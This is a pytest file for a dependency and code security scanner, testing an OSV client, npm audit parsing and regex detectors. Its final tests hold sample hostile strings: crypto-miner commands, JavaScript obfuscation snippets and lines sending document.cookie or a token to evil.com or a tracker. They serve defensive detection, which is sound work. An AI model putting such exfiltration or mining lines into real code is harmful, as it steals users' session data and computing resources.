"""Tests for OSV client and npm audit integration."""

import pytest
from unittest.mock import AsyncMock, patch, MagicMock


class TestOSVClient:
    @pytest.mark.asyncio
    async def test_query_osv_returns_list(self):
        from app.services.osv_client import query_osv

        # Mock httpx response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "vulns": [
                {
                    "id": "GHSA-test-1234",
                    "summary": "Test vulnerability",
                    "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}],
                    "aliases": ["CVE-2024-0001"],
                    "affected": [
                        {
                            "package": {"name": "test-pkg", "ecosystem": "npm"},
                            "ranges": [{"events": [{"introduced": "0"}, {"fixed": "1.2.3"}]}],
                        }
                    ],
                    "references": [{"type": "WEB", "url": "https://github.com/test/advisory"}],
                }
            ]
        }

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)

            vulns = await query_osv("test-pkg", "1.0.0", "npm")
            assert len(vulns) == 1
            assert vulns[0].vuln_id == "GHSA-test-1234"
            assert vulns[0].severity == "critical"  # CVSS 9.8 = critical

    @pytest.mark.asyncio
    async def test_query_osv_no_vulns(self):
        from app.services.osv_client import query_osv

        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"vulns": []}

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)

            vulns = await query_osv("safe-pkg", "1.0.0", "npm")
            assert len(vulns) == 0

    def test_osv_to_finding(self):
        from app.services.osv_client import OSVVulnerability, osv_to_finding

        vuln = OSVVulnerability(
            vuln_id="GHSA-test-1234",
            summary="Test vulnerability in package",
            severity="high",
            aliases=["CVE-2024-0001"],
            affected_package="test-pkg",
            affected_versions=">=1.0.0, <1.2.3",
            fixed_version="1.2.3",
            reference_url="https://github.com/test/advisory",
        )

        finding = osv_to_finding(vuln)
        assert finding.category == "dependency"
        assert finding.severity == "high"
        assert "test-pkg" in finding.title
        assert "1.2.3" in finding.remediation
        assert finding.source == "osv"

    def test_classify_severity_critical(self):
        from app.services.osv_client import _classify_severity

        result = _classify_severity([{"type": "CVSS_V3", "score": "9.8"}])
        assert result == "critical"

    def test_classify_severity_high(self):
        from app.services.osv_client import _classify_severity

        result = _classify_severity([{"type": "CVSS_V3", "score": "7.5"}])
        assert result == "high"

    def test_classify_severity_medium(self):
        from app.services.osv_client import _classify_severity

        result = _classify_severity([{"type": "CVSS_V3", "score": "5.0"}])
        assert result == "medium"

    def test_classify_severity_none(self):
        from app.services.osv_client import _classify_severity

        result = _classify_severity(None)
        assert result == "medium"

    def test_extract_fixed_version(self):
        from app.services.osv_client import _extract_fixed_version

        ranges = [{"events": [{"introduced": "0"}, {"fixed": "1.2.3"}]}]
        result = _extract_fixed_version(ranges)
        assert result == "1.2.3"

    def test_extract_fixed_version_none(self):
        from app.services.osv_client import _extract_fixed_version

        ranges = [{"events": [{"introduced": "0"}]}]
        result = _extract_fixed_version(ranges)
        assert result is None

    @pytest.mark.asyncio
    async def test_scan_dependencies_with_osv(self):
        from app.services.osv_client import scan_dependencies_with_osv

        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"vulns": []}

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)

            findings = await scan_dependencies_with_osv(
                {"test-pkg": "^1.0.0", "safe-pkg": "2.1.0"},
                ecosystem="npm",
            )
            assert isinstance(findings, list)


class TestNpmAudit:
    def test_parse_npm_audit_output_v2(self):
        from app.services.npm_audit import _parse_npm_audit_output

        output = {
            "vulnerabilities": {
                "test-pkg": {
                    "severity": "high",
                    "via": [
                        {
                            "title": "Test vulnerability",
                            "url": "https://github.com/test/advisory",
                            "range": ">=1.0.0 <1.2.3",
                            "version": "1.2.3",
                            "cwe": ["CWE-79"],
                        }
                    ],
                }
            }
        }

        vulns = _parse_npm_audit_output(output)
        assert len(vulns) == 1
        assert vulns[0].package == "test-pkg"
        assert vulns[0].severity == "high"

    def test_parse_npm_audit_output_empty(self):
        from app.services.npm_audit import _parse_npm_audit_output

        vulns = _parse_npm_audit_output({})
        assert len(vulns) == 0

    def test_severity_to_int(self):
        from app.services.npm_audit import _severity_to_int

        assert _severity_to_int("critical") == 4
        assert _severity_to_int("high") == 3
        assert _severity_to_int("moderate") == 2
        assert _severity_to_int("low") == 1
        assert _severity_to_int("unknown") == 2


class TestExternalAnalyzerEnhancements:
    def test_crypto_mining_patterns(self):
        import re
        from app.services.external_analyzer import CRYPTO_MINING_PATTERNS

        test_cases = [
            "stratum+tcp://pool.example.com:3333",
            "coinhive.com/lib/miner.js",
            "xmrig --algo=cryptonight",
            "minero.php?wallet=abc",
        ]

        for text in test_cases:
            found = False
            for pattern, title in CRYPTO_MINING_PATTERNS:
                if re.search(pattern, text):
                    found = True
                    break
            assert found, f"Should detect crypto mining in: {text}"

    def test_js_obfuscation_patterns(self):
        import re
        from app.services.external_analyzer import JS_OBFUSCATION_PATTERNS

        test_cases = [
            "eval(atob('SGVsbG8='))",
            "String.fromCharCode(72,101,108,108,111)",
            "\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64",
            "Function('return this')()",
        ]

        for text in test_cases:
            found = False
            for pattern, title in JS_OBFUSCATION_PATTERNS:
                if re.search(pattern, text):
                    found = True
                    break
            assert found, f"Should detect JS obfuscation in: {text}"

    def test_data_exfil_patterns(self):
        import re
        from app.services.external_analyzer import DATA_EXFIL_PATTERNS

        test_cases = [
            "fetch('https://evil.com/collect', {body: document.cookie})",
            "new Image().src = 'https://tracker.com/log?token=abc'",
            "navigator.userAgent sent to https://evil.com/collect",
        ]

        for text in test_cases:
            found = False
            for pattern, title in DATA_EXFIL_PATTERNS:
                if re.search(pattern, text):
                    found = True
                    break
            assert found, f"Should detect data exfiltration in: {text}"
